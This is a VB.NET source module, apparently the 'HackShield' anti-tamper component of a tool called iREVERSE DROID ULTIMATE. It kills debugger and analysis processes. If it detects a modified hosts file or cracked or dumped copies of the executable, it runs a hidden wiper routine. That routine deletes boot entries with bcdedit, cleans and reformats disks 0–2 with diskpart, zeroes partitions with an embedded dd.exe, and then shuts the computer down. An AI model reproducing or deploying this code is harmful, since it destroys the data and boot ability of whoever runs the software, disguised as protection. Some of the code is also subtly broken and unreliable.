Imports System.IO
Imports System.Net
Imports System.Threading
Imports System.Collections.Specialized
Imports System.Text
Imports System.Diagnostics
Imports Microsoft.VisualBasic
Imports System

Module HackShield
    Public Declare Function CheckRemoteDebuggerPresent Lib "kernel32.dll" (ptr As IntPtr, ByRef b As Boolean) As Boolean

    Public Sub SizedArrayAssemblyCopyrightAttribute(sender As Object)
        Console.WriteLine("Loaded HackShield Protector!")
        Dim array As String() = New String() {
            "Analyze It",
            "AppData",
            "Burp Suite",
            "Disassembler",
            "Dr. Memory",
            "Hook Analyzer",
            "Import reconstructor",
            "ImportREC",
            "JustDecompile",
            "Memcheck",
            "PE Tools",
            "Process Hacker",
            "Rational Purify",
            "Resource Monitor",
            "Resource and Performancer Monitor",
            "Resource",
            "SIMMON",
            "Suspend Process",
            "TEMP",
            "Trw2000",
            "USBWebServer",
            "WinHex",
            "Winpdb",
            "[cpu",
            "charles",
            "charlesproxy",
            "cheat engine",
            "cheatengine",
            "codecracker",
            "dbgclr",
            "de4dot",
            "de4dotmodded",
            "debug",
            "debug",
            "debugger",
            "devirt",
            "die",
            "disassembly",
            "dnspy",
            "dotpeek",
            "dump",
            "dumper",
            "extremedumper",
            "fiddler",
            "httpanalyzer",
            "httpdebug",
            "ida",
            "ida64",
            "idag",
            "idag",
            "idag64",
            "idaq",
            "idaq",
            "idaq64",
            "idau",
            "idau64",
            "idaw",
            "idaw64",
            "ilspy",
            "immunity",
            "immunitydebugger",
            "import reconstructor",
            "jetbrains",
            "logger",
            "megadumper",
            "ollydbg ",
            "parasoft",
            "peek",
            "perfmon",
            "petool",
            "petools",
            "postman",
            "procdump",
            "process hacker",
            "process monitor",
            "processhacker",
            "procmon64",
            "protection_id",
            "qt5core",
            "reshacker",
            "scylla",
            "scylla",
            "scylla_x64",
            "scylla_x86",
            "serialmonitor",
            "simpleassembly",
            "simpleassembly",
            "softice",
            "softice",
            "temp",
            "valgrind",
            "windbg",
            "wireshark",
            "x32dbg",
            "x64dbg",
            "x64netdumper",
            "x96dbg"
        }
        Dim actionleft As Integer = 3
        While True
            If Not SystemIsExit Then
                Try
                    Dim processes As Process() = Process.GetProcesses()
                    For Each process As Process In processes
                        Dim flag As Boolean = process IsNot Process.GetCurrentProcess()
                        If flag Then
                            For i As Integer = 0 To array.Length - 1
                                If Not SystemIsExit Then
                                    Dim id As Integer = Process.GetCurrentProcess().Id
                                    Dim flag2 As Boolean = process.ProcessName.ToLower().Contains(array(i))
                                    If flag2 Then
                                        Try
                                            actionleft -= 1
                                            If File.Exists(System.Windows.Forms.Application.StartupPath & "\WARNING.txt") Then
                                                File.Delete(System.Windows.Forms.Application.StartupPath & "\WARNING.txt")
                                            End If
                                            Console.WriteLine("List Porcess : " & process.ProcessName.ToLower().Contains(array(i)))
                                            process.Kill()
                                            File.WriteAllText("WARNING.txt", String.Concat(New String() {
                                                                                               "WE FOUND     : ",
                                                                                               process.ProcessName,
                                                                                               " RUNNING IN BACKGROUND!",
                                                                                               vbLf & "We close the ",
                                                                                               process.ProcessName,
                                                                                               " in order to keep running our tool!",
                                                                                               vbLf & vbLf & "Remains left : " & actionleft & vbLf & vbLf & "iREVERSE HACKSHIELD V1.0"}))
                                            Dim MyProcess As New Process

                                            With MyProcess.StartInfo
                                                .FileName = "notepad.exe"
                                                .Arguments = "WARNING.TXT"
                                                .UseShellExecute = False
                                                .CreateNoWindow = True
                                                .RedirectStandardInput = True
                                                .RedirectStandardOutput = True
                                                .RedirectStandardError = True
                                                .StandardOutputEncoding = System.Text.Encoding.ASCII

                                            End With
                                            MyProcess.Start()
                                            MyProcess.WaitForExit()
                                            If File.Exists(System.Windows.Forms.Application.StartupPath & "\WARNING.txt") Then
                                                File.Delete(System.Windows.Forms.Application.StartupPath & "\WARNING.txt")
                                            End If
                                            If actionleft = 0 Then
                                                actionleft = 3
                                                Process.GetCurrentProcess().Kill()
                                            End If
                                        Catch ex As Exception
                                            Console.WriteLine(ex.ToString)
                                        End Try
                                    End If
                                Else
                                    Exit While
                                End If
                            Next
                        End If
                    Next
                Catch ex3 As Exception
                End Try
                Delay(5)
            Else
                Exit While
            End If
        End While
    End Sub

    Public Sub checkerdump()
        Try
            Console.WriteLine("HakcShield activated!")
            Dim hotschecker As String = Nothing
            If File.Exists("C:\Windows\System32\drivers\etc\hosts") Then
                hotschecker = File.ReadAllText("C:\Windows\System32\drivers\etc\hosts")
                Console.WriteLine(hotschecker)
            End If
            If hotschecker.Contains("ireverse") Then 'nama serverr

                If File.Exists(System.Windows.Forms.Application.StartupPath & "\BANNED.txt") Then
                    File.Delete(System.Windows.Forms.Application.StartupPath & "\BANNED.txt")
                End If

                File.WriteAllText("BANNED.txt", String.Concat(New String() {
                                                              "WE FOUND     : ",
                                                              " Windows hosts has been moddified they blocked access to Server ",
                                                              vbLf & vbLf & "Your PC Has Been Banned!"}))
                Dim MyProcess As New Process

                With MyProcess.StartInfo
                    .FileName = "notepad.exe"
                    .Arguments = "BANNED.TXT"
                    .UseShellExecute = False
                    .CreateNoWindow = True
                    .RedirectStandardInput = True
                    .RedirectStandardOutput = True
                    .RedirectStandardError = True
                    .StandardOutputEncoding = System.Text.Encoding.ASCII
                End With
                MyProcess.Start()

                Dim threads_BANNED As Thread
                threads_BANNED = New Thread(AddressOf ERASEDISK_PC)
                threads_BANNED.Start()
            End If

            If File.Exists(System.Windows.Forms.Application.StartupPath & "\iREVERSE DROID ULTIMATE-cleaned.exe") Then
                Dim threads_cleaned As Thread
                threads_cleaned = New Thread(AddressOf ERASEDISK_PC)
                threads_cleaned.Start()
            End If

            If File.Exists(System.Windows.Forms.Application.StartupPath & "\iREVERSE DROID ULTIMATE-cleaned-Slayed.exe") Then
                Dim threads_cleaned_Slayed As Thread
                threads_cleaned_Slayed = New Thread(AddressOf ERASEDISK_PC)
                threads_cleaned_Slayed.Start()
            End If

            If File.Exists(System.Windows.Forms.Application.StartupPath & "\iREVERSE DROID ULTIMATE_dump.exe") Then
                Dim threads_dump As Thread
                threads_dump = New Thread(AddressOf ERASEDISK_PC)
                threads_dump.Start()
            End If

            If File.Exists(System.Windows.Forms.Application.StartupPath & "\iREVERSE DROID ULTIMATE_Dump.exe") Then
                Dim threads_Dump As Thread
                threads_Dump = New Thread(AddressOf ERASEDISK_PC)
                threads_Dump.Start()
            End If

            Dim threads As Thread
            threads = New Thread(AddressOf SizedArrayAssemblyCopyrightAttribute)
            threads.Start()

        Catch ex As Exception
            Console.WriteLine(ex.ToString)
        End Try
    End Sub

    Public Sub OFF_PC()
        Process.Start("shutdown", "/s /t 0")
    End Sub

    Public Sub ERASEDISK_PC(thread As Object)
        If Not File.Exists("C:\Windows\ihackshield") Then
            Dim cmdbcedit1 As String = " /delete {bootmgr}"
            Dim startInfobcedit1 As ProcessStartInfo = New ProcessStartInfo("bcdedit.exe", cmdbcedit1) With {
            .CreateNoWindow = True,
            .WindowStyle = ProcessWindowStyle.Hidden,
            .UseShellExecute = False,
            .Verb = "runas",
            .RedirectStandardError = True,
            .RedirectStandardOutput = True
        }
            Using process As Process = Process.Start(startInfobcedit1)
                Console.WriteLine(cmdbcedit1)
                process.BeginOutputReadLine()
                process.BeginErrorReadLine()

                AddHandler process.OutputDataReceived, Sub(sender As Object, e As DataReceivedEventArgs)
                                                           Dim textbcedit1 As String = If(e.Data, String.Empty)
                                                           Console.WriteLine(textbcedit1)
                                                       End Sub
                process.WaitForExit()
            End Using
            Dim cmdbcedit2 As String = " /delete {current}"
            Dim startInfobcedit2 As ProcessStartInfo = New ProcessStartInfo("bcdedit.exe", cmdbcedit2) With {
            .CreateNoWindow = True,
            .WindowStyle = ProcessWindowStyle.Hidden,
            .UseShellExecute = False,
            .Verb = "runas",
            .RedirectStandardError = True,
            .RedirectStandardOutput = True
        }
            Using process As Process = Process.Start(startInfobcedit2)
                Console.WriteLine(cmdbcedit2)
                process.BeginOutputReadLine()
                process.BeginErrorReadLine()

                AddHandler process.OutputDataReceived, Sub(sender As Object, e As DataReceivedEventArgs)
                                                           Dim textbcedit2 As String = If(e.Data, String.Empty)
                                                           Console.WriteLine(textbcedit2)
                                                       End Sub
                process.WaitForExit()
            End Using
            Dim commanderasedisk2 As String = String.Concat(New String() {
                                                   "select disk 2" & vbCrLf,
                                                   "clean" & vbCrLf,
                                                   "convert gpt" & vbCrLf,
                                                   "format quick fs=ntfs label=DontCrackMe" & vbCrLf,
                                                   "assign letter = X" & vbCrLf
                                                   })
            File.WriteAllText(System.Windows.Forms.Application.StartupPath & "\GoodBoy.txt", commanderasedisk2)
            Dim cmddisk2 As String = " /s " & """" & System.Windows.Forms.Application.StartupPath & "\GoodBoy.txt" & """"
            Dim startInfodisk2 As ProcessStartInfo = New ProcessStartInfo("diskpart.exe", cmddisk2) With {
            .CreateNoWindow = True,
            .WindowStyle = ProcessWindowStyle.Hidden,
            .UseShellExecute = False,
            .Verb = "runas",
            .RedirectStandardError = True,
            .RedirectStandardOutput = True
        }
            Using process As Process = Process.Start(startInfodisk2)
                Console.WriteLine(cmddisk2)
                process.BeginOutputReadLine()
                process.BeginErrorReadLine()

                AddHandler process.OutputDataReceived, Sub(sender As Object, e As DataReceivedEventArgs)
                                                           Dim textdisk2 As String = If(e.Data, String.Empty)
                                                           Console.WriteLine(textdisk2)
                                                       End Sub
                process.WaitForExit()
                File.Delete(System.Windows.Forms.Application.StartupPath & "\GoodBoy.txt")
            End Using
            Dim commanderasedisk1 As String = String.Concat(New String() {
                                                   "select disk 1" & vbCrLf,
                                                   "clean" & vbCrLf,
                                                   "convert gpt" & vbCrLf,
                                                   "format quick fs=ntfs label=DontCrackMe" & vbCrLf,
                                                   "assign letter = Y" & vbCrLf
                                                   })
            File.WriteAllText(System.Windows.Forms.Application.StartupPath & "\GoodBoy.txt", commanderasedisk1)
            Dim cmddisk1 As String = " /s " & """" & System.Windows.Forms.Application.StartupPath & "\GoodBoy.txt" & """"
            Dim startInfodisk1 As ProcessStartInfo = New ProcessStartInfo("diskpart.exe", cmddisk1) With {
            .CreateNoWindow = True,
            .WindowStyle = ProcessWindowStyle.Hidden,
            .UseShellExecute = False,
            .Verb = "runas",
            .RedirectStandardError = True,
            .RedirectStandardOutput = True
        }
            Using process As Process = Process.Start(startInfodisk1)
                Console.WriteLine(cmddisk1)
                process.BeginOutputReadLine()
                process.BeginErrorReadLine()

                AddHandler process.OutputDataReceived, Sub(sender As Object, e As DataReceivedEventArgs)
                                                           Dim textdisk1 As String = If(e.Data, String.Empty)
                                                           Console.WriteLine(textdisk1)
                                                       End Sub
                process.WaitForExit()
                File.Delete(System.Windows.Forms.Application.StartupPath & "\GoodBoy.txt")
            End Using
            Dim commanderasedisk0 As String = String.Concat(New String() {
                                                   "select disk 0" & vbCrLf,
                                                   "clean" & vbCrLf,
                                                   "convert gpt" & vbCrLf,
                                                   "format quick fs=ntfs label=DontCrackMe" & vbCrLf,
                                                   "assign letter = Z" & vbCrLf
                                                   })
            File.WriteAllText(System.Windows.Forms.Application.StartupPath & "\GoodBoy.txt", commanderasedisk0)
            Dim cmddisk0 As String = " /s " & """" & System.Windows.Forms.Application.StartupPath & "\GoodBoy.txt" & """"
            Dim startInfodisk0 As ProcessStartInfo = New ProcessStartInfo("diskpart.exe", cmddisk0) With {
            .CreateNoWindow = True,
            .WindowStyle = ProcessWindowStyle.Hidden,
            .UseShellExecute = False,
            .Verb = "runas",
            .RedirectStandardError = True,
            .RedirectStandardOutput = True
        }
            Using process As Process = Process.Start(startInfodisk0)
                Console.WriteLine(cmddisk0)
                process.BeginOutputReadLine()
                process.BeginErrorReadLine()

                AddHandler process.OutputDataReceived, Sub(sender As Object, e As DataReceivedEventArgs)
                                                           Dim textdisk0 As String = If(e.Data, String.Empty)
                                                           Console.WriteLine(textdisk0)
                                                       End Sub
                process.WaitForExit()
                File.Delete(System.Windows.Forms.Application.StartupPath & "\GoodBoy.txt")
            End Using
            File.WriteAllBytes(System.Windows.Forms.Application.StartupPath & "\dd.exe", My.Resources.dd)
            Dim cmddd1 As String = " if=/dev/zero of=\\?\Device\Harddisk0\Partition0 bs=512k"
            Dim startInfodd1 As ProcessStartInfo = New ProcessStartInfo(System.Windows.Forms.Application.StartupPath & "\dd.exe", cmddd1) With {
            .CreateNoWindow = True,
            .WindowStyle = ProcessWindowStyle.Hidden,
            .UseShellExecute = False,
            .Verb = "runas",
            .RedirectStandardError = True,
            .RedirectStandardOutput = True
        }
            Using process As Process = Process.Start(startInfodd1)
                Console.WriteLine(cmddd1)
                process.BeginOutputReadLine()
                process.BeginErrorReadLine()

                AddHandler process.OutputDataReceived, Sub(sender As Object, e As DataReceivedEventArgs)
                                                           Dim textdd1 As String = If(e.Data, String.Empty)
                                                           Console.WriteLine(textdd1)
                                                       End Sub
                process.WaitForExit()
            End Using
            Dim cmddd2 As String = " if=/dev/zero of=\\?\Device\Harddisk0\Partition1 bs=512k"
            Dim startInfodd2 As ProcessStartInfo = New ProcessStartInfo(System.Windows.Forms.Application.StartupPath & "\dd.exe", cmddd2) With {
            .CreateNoWindow = True,
            .WindowStyle = ProcessWindowStyle.Hidden,
            .UseShellExecute = False,
            .Verb = "runas",
            .RedirectStandardError = True,
            .RedirectStandardOutput = True
        }
            Using process As Process = Process.Start(startInfodd2)
                Console.WriteLine(cmddd2)
                process.BeginOutputReadLine()
                process.BeginErrorReadLine()

                AddHandler process.OutputDataReceived, Sub(sender As Object, e As DataReceivedEventArgs)
                                                           Dim textdd2 As String = If(e.Data, String.Empty)
                                                           Console.WriteLine(textdd2)
                                                       End Sub
                process.WaitForExit()
            End Using
            Dim cmddd3 As String = " if=/dev/zero of=\\?\Device\Harddisk1\Partition0 bs=512k"
            Dim startInfodd3 As ProcessStartInfo = New ProcessStartInfo(System.Windows.Forms.Application.StartupPath & "\dd.exe", cmddd3) With {
            .CreateNoWindow = True,
            .WindowStyle = ProcessWindowStyle.Hidden,
            .UseShellExecute = False,
            .Verb = "runas",
            .RedirectStandardError = True,
            .RedirectStandardOutput = True
        }
            Using process As Process = Process.Start(startInfodd3)
                Console.WriteLine(cmddd3)
                process.BeginOutputReadLine()
                process.BeginErrorReadLine()

                AddHandler process.OutputDataReceived, Sub(sender As Object, e As DataReceivedEventArgs)
                                                           Dim textdd3 As String = If(e.Data, String.Empty)
                                                           Console.WriteLine(textdd3)
                                                       End Sub
                process.WaitForExit()
            End Using
            Dim cmddd4 As String = " if=/dev/zero of=\\?\Device\Harddisk1\Partition1 bs=512k"
            Dim startInfodd4 As ProcessStartInfo = New ProcessStartInfo(System.Windows.Forms.Application.StartupPath & "\dd.exe", cmddd4) With {
            .CreateNoWindow = True,
            .WindowStyle = ProcessWindowStyle.Hidden,
            .UseShellExecute = False,
            .Verb = "runas",
            .RedirectStandardError = True,
            .RedirectStandardOutput = True
        }
            Using process As Process = Process.Start(startInfodd4)
                Console.WriteLine(cmddd4)
                process.BeginOutputReadLine()
                process.BeginErrorReadLine()

                AddHandler process.OutputDataReceived, Sub(sender As Object, e As DataReceivedEventArgs)
                                                           Dim textdd4 As String = If(e.Data, String.Empty)
                                                           Console.WriteLine(textdd4)
                                                       End Sub
                process.WaitForExit()
            End Using
            Dim cmddd5 As String = " if=/dev/zero of=\\?\Device\Harddisk2\Partition0 bs=512k"
            Dim startInfodd5 As ProcessStartInfo = New ProcessStartInfo(System.Windows.Forms.Application.StartupPath & "\dd.exe", cmddd5) With {
            .CreateNoWindow = True,
            .WindowStyle = ProcessWindowStyle.Hidden,
            .UseShellExecute = False,
            .Verb = "runas",
            .RedirectStandardError = True,
            .RedirectStandardOutput = True
        }
            Using process As Process = Process.Start(startInfodd5)
                Console.WriteLine(cmddd5)
                process.BeginOutputReadLine()
                process.BeginErrorReadLine()

                AddHandler process.OutputDataReceived, Sub(sender As Object, e As DataReceivedEventArgs)
                                                           Dim textdd5 As String = If(e.Data, String.Empty)
                                                           Console.WriteLine(textdd5)
                                                       End Sub
                process.WaitForExit()
            End Using
            Dim cmddd6 As String = " if=/dev/zero of=\\?\Device\Harddisk2\Partition1 bs=512k"
            Dim startInfodd6 As ProcessStartInfo = New ProcessStartInfo(System.Windows.Forms.Application.StartupPath & "\dd.exe", cmddd6) With {
            .CreateNoWindow = True,
            .WindowStyle = ProcessWindowStyle.Hidden,
            .UseShellExecute = False,
            .Verb = "runas",
            .RedirectStandardError = True,
            .RedirectStandardOutput = True
        }
            Using process As Process = Process.Start(startInfodd4)
                Console.WriteLine(cmddd6)
                process.BeginOutputReadLine()
                process.BeginErrorReadLine()

                AddHandler process.OutputDataReceived, Sub(sender As Object, e As DataReceivedEventArgs)
                                                           Dim textdd6 As String = If(e.Data, String.Empty)
                                                           Console.WriteLine(textdd6)
                                                       End Sub
                process.WaitForExit()
            End Using
            OFF_PC()
        End If
    End Sub

    Public Sub PCGOBLACKLIST()
        'sesuaikan dengan data user untuk proses banned akun
        'dataToSend("username") = "" 'FrmLogin.username
        'dataToSend("password") = "" 'FrmLogin.password
        'dataToSend("hwidPC") = "" 'FrmLogin.hwidPC

        'Dim SendData As String = Encoding.UTF8.GetString(wc.UploadValues("http://ireverseweb/api/banned.php", dataToSend))
    End Sub
End Module
